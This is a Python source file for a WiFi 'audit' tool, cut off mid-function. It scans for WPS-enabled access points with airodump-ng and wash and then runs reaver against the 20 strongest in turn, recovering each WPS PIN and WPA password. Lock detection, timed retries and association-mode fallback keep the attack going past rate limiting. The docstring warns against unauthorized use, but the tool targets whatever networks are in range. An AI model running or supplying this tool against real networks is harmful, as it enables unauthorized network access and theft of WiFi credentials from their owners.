#!/usr/bin/env python3
"""
wifi_audit.py

Active WiFi WPS penetration testing tool.

Phase 1: Runs airodump-ng (60s) and wash to scan for WPS-enabled networks
Phase 2: Attacks top 20 WPS-enabled targets by signal strength using reaver

Features:
- Live scan output
- Intelligent WPS lock detection and retry logic
- Association mode fallback (no-association -> direct)
- Real-time progress tracking
- Detailed results logging to file and console

Usage:
    # Passive scan only (no attacks):
    sudo python3 wifi_audit.py -i wlan0mon --passive

    # Active attack mode (default 60s scan):
    sudo python3 wifi_audit.py -i wlan0mon

    # Custom scan duration:
    sudo python3 wifi_audit.py -i wlan0mon -d 120

Requires:
    - airodump-ng (from aircrack-ng)
    - wash (from reaver)
    - reaver
    - iwconfig
    - python3

WARNING: Only use on networks you own or have explicit authorization to test.
         Unauthorized access to computer networks is illegal.
"""

import argparse
import csv
import subprocess
import time
import os
import sys
import re
import curses
from collections import deque
from datetime import datetime
from dataclasses import dataclass
from typing import Dict, List


# ---------------------------------------------------------
# Constants
# ---------------------------------------------------------

# Important keywords for reaver output filtering
_IMPORTANT_KEYWORDS = (
    "[+]", "[!]", "WPS PIN", "WPA PSK", "WARNING",
    "Failed to associate", "rate limiting", "Detected AP"
)


# ---------------------------------------------------------
# Data Classes
# ---------------------------------------------------------

@dataclass
class AccessPoint:
    bssid: str
    pwr: int
    channel: str
    essid: str
    privacy: str
    cipher: str
    auth: str
    wps: str = "?"
    locked: str = "?"
    status: str = "PENDING"


@dataclass
class AttackResult:
    target_num: int
    bssid: str
    essid: str
    channel: str
    status: str  # SUCCESS | FAILED | LOCKED | PENDING | IN_PROGRESS
    wps_pin: str
    password: str
    time_spent: float
    retries: int
    current_pin: str = "-"
    pin_progress: int = 0  # Percentage 0-100


# ---------------------------------------------------------
# CSV Parsing Cache (shared by TUI and helpers)
# ---------------------------------------------------------

class CSVCache:
    """Cache for airodump CSV parsing to avoid redundant file reads."""
    __slots__ = ('mtime', 'size', 'count', 'wps_count', 'aps')

    def __init__(self):
        self.mtime = 0
        self.size = 0
        self.count = 0
        self.wps_count = 0
        self.aps = []

_csv_cache = CSVCache()


def parse_csv_cached(csv_file: str) -> tuple:
    """Parse airodump CSV with caching. Returns (total_count, wps_count, aps_list).
    Uses file mtime/size to avoid re-parsing unchanged files."""
    global _csv_cache

    if not os.path.exists(csv_file):
        return (0, 0, [])

    try:
        stat = os.stat(csv_file)
        if stat.st_mtime == _csv_cache.mtime and stat.st_size == _csv_cache.size:
            return (_csv_cache.count, _csv_cache.wps_count, _csv_cache.aps)

        # File changed, re-parse
        count = 0
        wps_count = 0
        aps = []

        with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            in_ap_section = False

            for row in reader:
                if not row:
                    continue

                if row[0] == "BSSID":
                    in_ap_section = True
                    continue

                if in_ap_section:
                    bssid = row[0].strip() if row else ""
                    if not bssid or bssid == "Station MAC":
                        break

                    if ":" in bssid:
                        count += 1
                        wps_status = row[14].strip() if len(row) > 14 and row[14] else ""
                        # WPS can be: version number (1.0, 2.0), "WPS", "Locked", "Lck"
                        # Any non-empty value except explicit "No" indicates WPS enabled
                        if wps_status and wps_status not in ("No", ""):
                            wps_count += 1

                        aps.append({
                            'bssid': bssid,
                            'channel': row[3].strip() if len(row) > 3 else '',
                            'privacy': row[5].strip() if len(row) > 5 else '',
                            'pwr': row[8].strip() if len(row) > 8 else '',
                            'essid': row[13].strip() if len(row) > 13 else '',
                            'wps': wps_status or '?',
                        })

        # Sort by signal strength (PWR closer to 0 is stronger)
        aps.sort(key=lambda x: int(x['pwr']) if x['pwr'].lstrip('-').isdigit() else -999, reverse=True)

        # Update cache
        _csv_cache.mtime = stat.st_mtime
        _csv_cache.size = stat.st_size
        _csv_cache.count = count
        _csv_cache.wps_count = wps_count
        _csv_cache.aps = aps

        return (count, wps_count, aps)

    except Exception:
        return (_csv_cache.count, _csv_cache.wps_count, _csv_cache.aps)


def count_aps_in_csv(csv_file: str) -> tuple:
    """Count APs in airodump CSV. Returns (total_count, wps_count)."""
    count, wps_count, _ = parse_csv_cached(csv_file)
    return (count, wps_count)


# ---------------------------------------------------------
# TUI Manager
# ---------------------------------------------------------

class WifiAuditTUI:
    """Curses-based TUI manager for htop-style non-scrolling display."""

    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.output_buffer = deque(maxlen=50)  # Keep last 50 lines
        self.enabled = True

        # Scroll state for output window
        self.scroll_offset = 0  # 0 = viewing most recent (bottom), positive = scrolled up
        self.auto_scroll = True  # Auto-scroll to bottom on new output

        # Scan phase state for live table display
        self.scan_results = []  # Store discovered APs during scan phase
        self.scan_phase = True  # True during airodump/wash, False during attacks
        self.scan_scroll_offset = 0  # Scroll offset for scan table

        # Initialize curses colors
        try:
            curses.start_color()
            curses.use_default_colors()
            curses.init_pair(1, curses.COLOR_GREEN, -1)   # Success
            curses.init_pair(2, curses.COLOR_RED, -1)     # Failed/Error
            curses.init_pair(3, curses.COLOR_YELLOW, -1)  # Warning
            curses.init_pair(4, curses.COLOR_CYAN, -1)    # Info
            curses.init_pair(5, curses.COLOR_MAGENTA, -1) # In Progress
        except:
            # Color support not available
            pass

        # Hide cursor
        try:
            curses.curs_set(0)
        except:
            pass

        # Set nodelay for non-blocking input
        self.stdscr.nodelay(True)

    def add_output_line(self, line: str):
        """Add a line to the output buffer."""
        if not self.enabled:
            print(line)
            return
        self.output_buffer.append(line)
        if self.auto_scroll:
            self.scroll_offset = 0  # Stay at bottom when auto-scrolling

    def update_progress_line(self, line: str, tag: str = "[SCAN]"):
        """Update the last line if it's a progress message, otherwise append."""
        if not self.enabled:
            print(f"\r{line}", end="", flush=True)
            return

        # If last line starts with the same tag, replace it
        if self.output_buffer and self.output_buffer[-1].startswith(tag):
            self.output_buffer[-1] = line
        else:
            self.output_buffer.append(line)

    def get_output_window_height(self):
        """Get the number of lines available for output display."""
        try:
            max_y, _ = self.stdscr.getmaxyx()
            # Estimate: header(3) + table(varies) + output_header(3) + margin(1)
            return max(5, max_y - 20)
        except:
            return 10

    def handle_input(self):
        """Handle keyboard input for scrolling. Returns True if input was handled."""
        if not self.enabled:
            return False

        try:
            key = self.stdscr.getch()
            if key == -1:  # No input
                return False

            # During scan phase, scroll the scan table
            if self.scan_phase and self.scan_results:
                max_scroll = max(0, len(self.scan_results) - self.get_scan_table_height())

                if key == curses.KEY_UP or key == ord('k'):
                    self.scan_scroll_offset = max(self.scan_scroll_offset - 1, 0)
                    return True
                elif key == curses.KEY_DOWN or key == ord('j'):
                    self.scan_scroll_offset = min(self.scan_scroll_offset + 1, max_scroll)
                    return True
                elif key == curses.KEY_PPAGE:  # Page Up
                    self.scan_scroll_offset = max(self.scan_scroll_offset - 10, 0)
                    return True
                elif key == curses.KEY_NPAGE:  # Page Down
                    self.scan_scroll_offset = min(self.scan_scroll_offset + 10, max_scroll)
                    return True
                elif key == curses.KEY_HOME:
                    self.scan_scroll_offset = 0
                    return True
                elif key == curses.KEY_END:
                    self.scan_scroll_offset = max_scroll
                    return True
            else:
                # During attack phase, scroll the output window
                max_scroll = max(0, len(self.output_buffer) - self.get_output_window_height())

                if key == curses.KEY_UP or key == ord('k'):
                    self.scroll_offset = min(self.scroll_offset + 1, max_scroll)
                    self.auto_scroll = False
                    return True
                elif key == curses.KEY_DOWN or key == ord('j'):
                    self.scroll_offset = max(self.scroll_offset - 1, 0)
                    if self.scroll_offset == 0:
                        self.auto_scroll = True
                    return True
                elif key == curses.KEY_PPAGE:  # Page Up
                    self.scroll_offset = min(self.scroll_offset + 10, max_scroll)
                    self.auto_scroll = False
                    return True
                elif key == curses.KEY_NPAGE:  # Page Down
                    self.scroll_offset = max(self.scroll_offset - 10, 0)
                    if self.scroll_offset == 0:
                        self.auto_scroll = True
                    return True
                elif key == curses.KEY_HOME:
                    self.scroll_offset = max_scroll
                    self.auto_scroll = False
                    return True
                elif key == curses.KEY_END:
                    self.scroll_offset = 0
                    self.auto_scroll = True
                    return True
        except:
            pass
        return False

    def get_color_for_line(self, line: str) -> int:
        """Determine color pair based on line content."""
        if "[+]" in line or "SUCCESS" in line:
            return curses.color_pair(1)  # Green
        elif "[!]" in line or "WARNING" in line or "Failed" in line:
            return curses.color_pair(2)  # Red
        elif "Trying pin" in line or "IN_PROGRESS" in line:
            return curses.color_pair(5)  # Magenta
        elif "[*]" in line:
            return curses.color_pair(4)  # Cyan
        return 0

    def draw_header(self, stats: Dict, y_offset: int = 0) -> int:
        """Draw header with overall stats. Returns next y position."""
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        try:
            # Title
            header = "=== WiFi WPS Attack Progress ==="
            self.stdscr.addstr(y, 0, header.ljust(max_x - 1), curses.A_BOLD)
            y += 1

            # Stats
            total = stats['total']
            completed = stats['completed']
            percent = int((completed / total) * 100) if total > 0 else 0

            stats_line = f"Overall: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}"
            self.stdscr.addstr(y, 0, stats_line.ljust(max_x - 1))
            y += 1

            # Separator
            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

        except curses.error:
            pass

        return y

    def draw_targets_table(self, results: List[AttackResult], y_offset: int) -> int:
        """Draw targets table. Returns next y position."""
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        try:
            # Table header
            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<45}"
            self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
            y += 1

            # Separator
            separator = "-" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Table rows (show as many as fit on screen)
            table_start_y = y
            available_rows = max_y - y - 10  # Reserve 10 lines for output window

            for idx, result in enumerate(results):
                if y >= table_start_y + available_rows:
                    break

                num = f"{result.target_num}"
                essid = result.essid[:20]
                bssid = result.bssid

                # Session status
                if result.status == "PENDING":
                    session = "Pending"
                elif result.status == "IN_PROGRESS":
                    session = "In Progress"
                elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
                    session = "Completed"
                else:
                    session = result.status

                # Result/Progress column
                if result.status == "PENDING":
                    progress = "-"
                    color = 0
                elif result.status == "IN_PROGRESS":
                    if result.current_pin != "-":
                        progress = f"PIN: {result.current_pin} | {result.pin_progress}%"
                    else:
                        progress = "Initializing..."
                    color = curses.color_pair(5)  # Magenta
                elif result.status == "SUCCESS":
                    progress = f"SUCCESS | PIN: {result.wps_pin}"
                    color = curses.color_pair(1)  # Green
                elif result.status == "LOCKED":
                    progress = "LOCKED (rate limiting)"
                    color = curses.color_pair(2)  # Red
                elif result.status == "FAILED":
                    progress = "FAILED"
                    color = curses.color_pair(2)  # Red
                else:
                    progress = result.status
                    color = 0

                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<45}"
                self.stdscr.addstr(y, 0, row[:max_x - 1], color)
                y += 1

        except curses.error:
            pass

        return y

    def get_scan_table_height(self):
        """Get the number of rows available for scan table display."""
        try:
            max_y, _ = self.stdscr.getmaxyx()
            # Reserve: header(3) + table_header(2) + output_window(12)
            return max(5, max_y - 17)
        except:
            return 10

    def draw_scan_table(self, y_offset: int) -> int:
        """Draw discovered WPS-enabled networks during scan phase. Returns next y position."""
        max_y, max_x = self.stdscr.getmaxyx()
        y = y_offset

        # Filter for confirmed WPS-enabled networks only
        # WPS can be: version (1.0, 2.0), "WPS", "Locked", "Lck" - anything non-empty except "No" or "?"
        wps_aps = [ap for ap in self.scan_results if ap.get('wps', '') and ap.get('wps', '') not in ('No', '?', '')]
        total_wps = len(wps_aps)

        try:
            # Calculate available rows and scroll bounds
            available_rows = max_y - y - 12  # Reserve space for output window
            max_scroll = max(0, total_wps - available_rows)

            # Clamp scroll offset to valid range
            self.scan_scroll_offset = max(0, min(self.scan_scroll_offset, max_scroll))

            # Calculate display range
            start_idx = self.scan_scroll_offset
            end_idx = start_idx + available_rows

            # Table header with scroll indicator (show WPS targets only)
            if self.scan_scroll_offset > 0 or total_wps > available_rows:
                header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ENC':<8} | {'WPS':<5} [WPS: {start_idx+1}-{min(end_idx, total_wps)}/{total_wps}]"
            else:
                header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'CH':<3} | {'PWR':<4} | {'ENC':<8} | {'WPS':<5} [WPS targets: {total_wps}]"
            self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
            y += 1

            separator = "-" * min(len(header), max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Show rows with scroll offset applied (WPS networks only)
            for idx, ap in enumerate(wps_aps[start_idx:end_idx]):
                actual_idx = start_idx + idx
                num = f"{actual_idx + 1}"

                # Show placeholder for hidden networks
                essid = ap.get('essid', '').strip()
                if not essid:
                    essid = '<< Hidden ESSID >>'
                essid = essid[:20]

                bssid = ap.get('bssid', '')
                channel = ap.get('channel', '')[:3]
                pwr = str(ap.get('pwr', ''))[:4]
                enc = ap.get('privacy', '')[:8]
                wps = ap.get('wps', '?')[:5]

                # Color based on WPS status
                # WPS version (1.0, 2.0) or "WPS" = enabled (green)
                # "Locked" or "Lck" = locked (yellow)
                if wps in ('Locked', 'Lck'):
                    color = curses.color_pair(3)  # Yellow - WPS locked
                elif wps and wps not in ('No', '?', ''):
                    color = curses.color_pair(1)  # Green - WPS enabled (version or "WPS")
                else:
                    color = 0

                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {channel:<3} | {pwr:<4} | {enc:<8} | {wps:<5}"
                self.stdscr.addstr(y, 0, row[:max_x - 1], color)
                y += 1

                if y >= max_y - 12:
                    break

        except curses.error:
            pass

        return y

    def draw_output_window(self, y_offset: int):
        """Draw the live output window with scroll support."""
        max_y, max_x = self.stdscr.getmaxyx()

        try:
            # Output window header
            y = y_offset
            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Show scroll indicator in header if scrolled
            if self.scroll_offset > 0:
                header = f"=== Live Audit Output (Scrolled: +{self.scroll_offset} lines, ↓/j=newer) ==="
            else:
                header = "=== Live Audit Output (↑/k=scroll, Last 50 lines) ==="
            self.stdscr.addstr(y, 0, header.ljust(max_x - 1), curses.A_BOLD)
            y += 1

            separator = "=" * (max_x - 1)
            self.stdscr.addstr(y, 0, separator)
            y += 1

            # Draw output lines with scroll offset
            available_lines = max_y - y - 1
            total_lines = len(self.output_buffer)

            # Calculate which lines to show based on scroll offset
            if total_lines <= available_lines:
                # All lines fit, no scrolling needed
                lines_to_show = list(self.output_buffer)
            else:
                # Apply scroll offset (scroll_offset=0 means show most recent)
                end_idx = total_lines - self.scroll_offset
                start_idx = max(0, end_idx - available_lines)
                lines_to_show = list(self.output_buffer)[start_idx:end_idx]

            for line in lines_to_show:
                if y >= max_y - 1:
                    break

                color = self.get_color_for_line(line)
                # Truncate line to fit screen width
                display_line = line[:max_x - 1]
                self.stdscr.addstr(y, 0, display_line, color)
                y += 1

        except curses.error:
            pass

    def refresh_display(self, results: List[AttackResult], stats: Dict):
        """Refresh the entire display."""
        if not self.enabled:
            return

        # Handle any pending keyboard input for scrolling
        self.handle_input()

        try:
            # Clear screen
            self.stdscr.clear()

            # Draw components
            y = 0
            y = self.draw_header(stats, y)

            # During scan phase, show discovered networks; during attack, show targets
            if self.scan_phase and self.scan_results:
                y = self.draw_scan_table(y)
            else:
                y = self.draw_targets_table(results, y)

            self.draw_output_window(y)

            # Refresh screen
            self.stdscr.refresh()

        except curses.error as e:
            # Log curses errors - screen might be too small
            self.enabled = False
            raise Exception(f"Curses error in refresh_display: {e}. Terminal might be too small.")
        except Exception as e:
            self.enabled = False
            raise

    def print(self, message: str):
        """Print a message (adds to output buffer and refreshes)."""
        if not self.enabled:
            print(message)
            return
        self.add_output_line(message)


# ---------------------------------------------------------
# Helpers
# ---------------------------------------------------------

def check_monitor_mode(interface: str) -> bool:
    """Verify interface is in monitor mode."""
    try:
        output = subprocess.check_output(
            ["iwconfig", interface],
            stderr=subprocess.STDOUT
        ).decode()
        return "Mode:Monitor" in output
    except subprocess.CalledProcessError:
        return False


def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
    """Run airodump-ng for `duration` sec and save CSV."""
    csv_path = f"{prefix}-01.csv"

    tui_print(f"[+] Running airodump-ng for {duration} seconds...", tui)

    # Run airodump in background (it needs a TTY for display, so we suppress output)
    proc = subprocess.Popen(
        ["sudo", "timeout", str(duration),
         "airodump-ng", "--wps", "--write", prefix, "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Show progress bar while scanning
    start = time.time()
    bar_width = 40
    while proc.poll() is None:
        elapsed = int(time.time() - start)
        progress = min(elapsed / duration, 1)
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        percent = int(progress * 100)

        # Parse CSV once (cached) - gets counts and AP list in single call
        ssid_count, wps_count, aps = parse_csv_cached(csv_path)

        msg = f"[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | SSIDs: {ssid_count} (WPS: {wps_count})"
        if tui and tui.enabled:
            tui.scan_results = aps  # Direct assignment, already sorted
            tui.update_progress_line(msg, "[SCAN]")
            dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
            tui.refresh_display([], dummy_stats)
        else:
            print(f"\r{msg}", end="", flush=True)

        if elapsed >= duration:
            break
        time.sleep(0.5)

    proc.wait()

    # Log if airodump exited with error (ignore timeout signal -9/124)
    if proc.returncode and proc.returncode not in (0, -9, 124):
        tui_print(f"[!] airodump-ng exited with code {proc.returncode}", tui)

    if not (tui and tui.enabled):
        print()  # Newline for legacy mode
    tui_print("[+] Finished airodump scan.", tui)
    return csv_path


def parse_airodump_csv(csv_file: str) -> Dict[str, AccessPoint]:
    """Parse APs from airodump CSV."""
    aps = {}

    with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        in_ap_section = False

        for row in reader:
            if not row:
                continue

            if row[0] == "BSSID":
                in_ap_section = True
                continue

            if in_ap_section:
                if len(row) < 14:
                    continue

                try:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    privacy = row[5].strip()
                    cipher = row[6].strip()
                    auth = row[7].strip()
                    pwr = row[8].strip()
                    essid = row[13].strip()
                    # Extract WPS data from column 14 (if available with --wps flag)
                    wps_status = row[14].strip() if len(row) > 14 else ""
                except:
                    continue

                if not bssid or bssid == "Station MAC":
                    break

                pwr = int(pwr) if pwr not in ("", "NA") else -999

                # Parse WPS status from airodump --wps output
                # Possible values: version (1.0, 2.0), "Locked"/"Lck" (locked), "No" (disabled), "" (unknown)
                if wps_status in ["Locked", "Lck"]:
                    wps = "Yes"
                    locked = "Yes"
                elif wps_status == "No" or wps_status == "":
                    wps = "No" if wps_status == "No" else "?"
                    locked = "No" if wps_status == "No" else "?"
                elif wps_status:
                    # Any other value (1.0, 2.0, "WPS", etc.) means WPS is enabled
                    wps = "Yes"
                    locked = "No"
                else:
                    wps = "?"
                    locked = "?"

                aps[bssid] = AccessPoint(
                    bssid=bssid,
                    pwr=pwr,
                    channel=channel,
                    essid=essid,
                    privacy=privacy,
                    cipher=cipher,
                    auth=auth,
                    wps=wps,
                    locked=locked,
                )

    return aps


def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[str, str]]:
    """Run wash and collect WPS + Locked data."""
    import select

    tui_print(f"[+] Running wash for {duration} seconds (WPS lock validation)...", tui)

    # Run wash in background with line-buffered output
    proc = subprocess.Popen(
        ["timeout", str(duration), "wash", "-i", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        bufsize=1  # Line buffered
    )

    # Show progress bar while scanning, reading output incrementally
    start = time.time()
    bar_width = 40
    output_lines = []
    wps_found = 0

    while proc.poll() is None:
        elapsed = int(time.time() - start)
        progress = min(elapsed / duration, 1)
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        percent = int(progress * 100)

        # Try to read any available output (non-blocking)
        try:
            # Use select to check if data is available (Unix only)
            ready, _, _ = select.select([proc.stdout], [], [], 0.1)
            if ready:
                line = proc.stdout.readline()
                if line:
                    decoded_line = line.decode(errors='ignore')
                    output_lines.append(decoded_line)
                    # Count if it's a valid WPS line (has BSSID in first 17 chars)
                    if len(decoded_line) > 17 and ":" in decoded_line[:17]:
                        wps_found += 1
                        # Update scan_results with confirmed WPS status
                        bssid = decoded_line[:17].strip()
                        if tui and tui.enabled and tui.scan_results:
                            for ap in tui.scan_results:
                                if ap.get('bssid', '').upper() == bssid.upper():
                                    # Check if locked (Lck column or Yes in lock column)
                                    if 'Lck' in decoded_line or 'Yes' in decoded_line:
                                        ap['wps'] = 'Locked'
                                    else:
                                        ap['wps'] = 'WPS'
                                    break
        except:
            pass

        msg = f"[WASH] |{bar}| {percent}% ({elapsed}/{duration}s) | Confirmed WPS: {wps_found}"
        if tui and tui.enabled:
            tui.update_progress_line(msg, "[WASH]")
            # Refresh display to show progress during scan
            dummy_stats = {'total': 0, 'completed': 0, 'success': 0, 'failed': 0, 'locked': 0}
            tui.refresh_display([], dummy_stats)
        else:
            print(f"\r{msg}", end="", flush=True)

        if elapsed >= duration:
            break
        time.sleep(0.4)  # Slightly shorter sleep to be more responsive

    # Read any remaining output
    try:
        remaining = proc.stdout.read()
        if remaining:
            for line in remaining.decode(errors='ignore').splitlines():
                output_lines.append(line)
                if len(line) > 17 and ":" in line[:17]:
                    wps_found += 1
                    # Update scan_results with confirmed WPS status
                    bssid = line[:17].strip()
                    if tui and tui.enabled and tui.scan_results:
                        for ap in tui.scan_results:
                            if ap.get('bssid', '').upper() == bssid.upper():
                                if 'Lck' in line or 'Yes' in line:
                                    ap['wps'] = 'Locked'
                                else:
                                    ap['wps'] = 'WPS'
                                break
    except:
        pass

    proc.wait()

    # Log if wash exited with error (ignore timeout signal -9/124)
    if proc.returncode and proc.returncode not in (0, -9, 124):
        tui_print(f"[!] wash exited with code {proc.returncode}", tui)

    if not (tui and tui.enabled):
        print()  # New line after progress bar for legacy mode

    # Process the collected output
    output = "\n".join(output_lines)

    wps_data = {}

    for line in output.splitlines():
        if ":" not in line or "BSSID" in line:
            continue

        parts = line.split()
        if len(parts) < 6:
            continue

        bssid = parts[0]
        wps_ver = parts[3]
        locked = parts[4]

        wps_data[bssid] = {
            "wps": wps_ver,
            "locked": locked,
        }

    return wps_data


def detect_wps_lock(output_line: str) -> bool:
    """Detect if reaver output indicates WPS lock."""
    lock_patterns = [
        "WARNING: Failed to associate",
        "WPS transaction failed",
        "Detected AP rate limiting",
        "Receive timeout occurred",
        "WPS transaction failed (code: 0x03)"
    ]
    return any(pattern in output_line for pattern in lock_patterns)


def tui_print(message: str, tui=None):
    """Print message using TUI if available, otherwise regular print."""
    if tui and tui.enabled:
        tui.add_output_line(message)
    else:
        print(message)


def wait_with_countdown(seconds: int, reason: str = "WPS lock detected", tui=None, results=None, stats=None):
    """Display countdown timer."""
    tui_print(f"\n[!] {reason}, waiting {seconds // 60} minutes...", tui)
    end_time = time.time() + seconds

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        mins, secs = divmod(remaining, 60)
        msg = f"[WAIT] {mins:02d}:{secs:02d} remaining..."
        if tui and tui.enabled:
            # Use update_progress_line instead of add_output_line to avoid filling buffer
            tui.update_progress_line(msg, "[WAIT]")
            # Refresh display to show countdown
            if results is not None and stats is not None:
                tui.refresh_display(results, stats)
            time.sleep(1)
        else:
            print(f"\r{msg}", end="", flush=True)
            time.sleep(1)

    tui_print("[+] Resuming attack...", tui)


def update_targets_table(results: List[AttackResult], stats: Dict, tui=None):
    """
    Update and display the fixed targets table at top of screen.
    This shows all targets with their current status and progress.
    """
    # Use TUI if available, otherwise fallback to legacy print mode
    if tui and tui.enabled:
        tui.refresh_display(results, stats)
        return

    # Legacy mode (--no-curses): Move cursor to home position and clear screen
    print("\033[2J\033[H", end="", flush=True)

    # Header
    print("=" * 120)
    print("=== WiFi WPS Attack Progress ===")
    print("=" * 120)

    total = stats['total']
    completed = stats['completed']
    percent = int((completed / total) * 100) if total > 0 else 0

    print(f"Overall Progress: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")
    print("=" * 120)

    # Table header
    print(f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<55}")
    print("-" * 120)

    # Table rows
    for result in results:
        num = f"{result.target_num}"
        essid = result.essid[:20]
        bssid = result.bssid

        # Session status
        if result.status == "PENDING":
            session = "Pending"
        elif result.status == "IN_PROGRESS":
            session = "In Progress"
        elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
            session = "Completed"
        else:
            session = result.status

        # Result/Progress column
        if result.status == "PENDING":
            progress = "-"
        elif result.status == "IN_PROGRESS":
            if result.current_pin != "-":
                progress = f"Testing PIN: {result.current_pin} | Progress: {result.pin_progress}%"
            else:
                progress = "Initializing attack..."
        elif result.status == "SUCCESS":
            progress = f"SUCCESS | PIN: {result.wps_pin} | Pass: {result.password}"
        elif result.status == "LOCKED":
            progress = f"LOCKED (WPS rate limiting detected, max retries reached)"
        elif result.status == "FAILED":
            progress = f"FAILED (no WPS PIN found)"
        else:
            progress = result.status

        print(f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<55}")

    print("=" * 120)
    print("\n=== Live Audit Output ===\n")


def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                      stats: Dict, all_results: List[AttackResult],
                      max_retries: int = 10, verbose: bool = False, tui=None) -> AttackResult:
    """
    Run reaver against a single target with lock detection/retry logic.
    Updates result_obj in real-time for live progress display.
    """
    start_time = time.time()
    retry_count = 0
    use_no_association = True

    tui_print(f"[+] Starting attack on {target.essid} ({target.bssid})", tui)

    while retry_count <= max_retries:
        # Build reaver command
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target.bssid,
            "-c", target.channel,
            "-d", "3",
            "-vv"
        ]

        if use_no_association:
            cmd.append("-N")
            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (no-association mode)", tui)
        else:
            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (direct association mode)", tui)

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            last_progress_time = time.time()
            wps_pin = None
            password = None
            locked = False
            association_failed = False
            pins_tried = 0
            total_pins = 11000  # Approximate total WPS PINs to try

            # Monitor output
            last_refresh = time.time()
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break

                if line:
                    # Determine if we should print this line based on verbose mode
                    should_print = verbose

                    # Always print important lines regardless of verbose mode
                    if any(keyword in line for keyword in _IMPORTANT_KEYWORDS):
                        should_print = True

                    if should_print:
                        tui_print(line.rstrip(), tui)

                    # Extract current PIN being tested
                    pin_match = re.search(r"Trying pin[:\s]+['\"]?(\d{8})['\"]?", line, re.IGNORECASE)
                    if pin_match:
                        current_pin = pin_match.group(1)
                        result_obj.current_pin = current_pin
                        pins_tried += 1
                        result_obj.pin_progress = min(int((pins_tried / total_pins) * 100), 99)

                        # Update table every 10 PINs to avoid excessive redraws
                        if pins_tried % 10 == 0:
                            update_targets_table(all_results, stats, tui)
                            last_refresh = time.time()

                # Refresh display periodically even without new output (for TUI mode)
                if tui and tui.enabled and (time.time() - last_refresh) > 2:
                    update_targets_table(all_results, stats, tui)
                    last_refresh = time.time()

                if line:
                    # Check for success
                    if "[+] WPS PIN:" in line:
                        match = re.search(r"WPS PIN: '(\d+)'", line)
                        if match:
                            wps_pin = match.group(1)
                            result_obj.wps_pin = wps_pin
                            result_obj.pin_progress = 100
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats, tui)

                    if "[+] WPA PSK:" in line:
                        match = re.search(r"WPA PSK: '(.+)'", line)
                        if match:
                            password = match.group(1)
                            result_obj.password = password
                            last_progress_time = time.time()
                            update_targets_table(all_results, stats, tui)

                    # Check for lock
                    if detect_wps_lock(line):
                        locked = True

                    # Check for association failure
                    if "Failed to associate" in line or "WARNING: Failed to associate" in line:
                        association_failed = True

                    # Any progress resets timer
                    if any(indicator in line for indicator in ["Trying pin", "Sending", "Received"]):
                        last_progress_time = time.time()

                # Check if stuck (no progress for 60 seconds)
                if time.time() - last_progress_time > 60:
                    tui_print("[!] No progress for 60 seconds, assuming locked", tui)
                    locked = True
                    proc.kill()
                    break

            proc.wait()

            # Log if reaver exited with error
            if proc.returncode and proc.returncode not in (0, -9, -15):  # -9=SIGKILL, -15=SIGTERM
                tui_print(f"[!] reaver exited with code {proc.returncode}", tui)

            # Check if we succeeded
            if wps_pin:
                elapsed = time.time() - start_time
                tui_print(f"[+] SUCCESS! WPS PIN: {wps_pin}", tui)
                if password:
                    tui_print(f"[+] Password: {password}", tui)

                result_obj.status = "SUCCESS"
                result_obj.wps_pin = wps_pin
                result_obj.password = password or "-"
                result_obj.time_spent = elapsed
                result_obj.retries = retry_count
                result_obj.pin_progress = 100
                update_targets_table(all_results, stats, tui)
                return result_obj

            # Handle association failure - switch modes
            if association_failed and use_no_association:
                tui_print("[!] No-association mode failed, switching to direct association", tui)
                use_no_association = False
                continue

            # Handle WPS lock
            if locked:
                retry_count += 1
                if retry_count <= max_retries:
                    wait_with_countdown(300, "WPS lock detected", tui, all_results, stats)  # 5 minutes
                    use_no_association = True  # Reset to no-association for retry
                else:
                    tui_print(f"[!] Max retries ({max_retries}) reached, target locked", tui)
                    elapsed = time.time() - start_time
                    result_obj.status = "LOCKED"
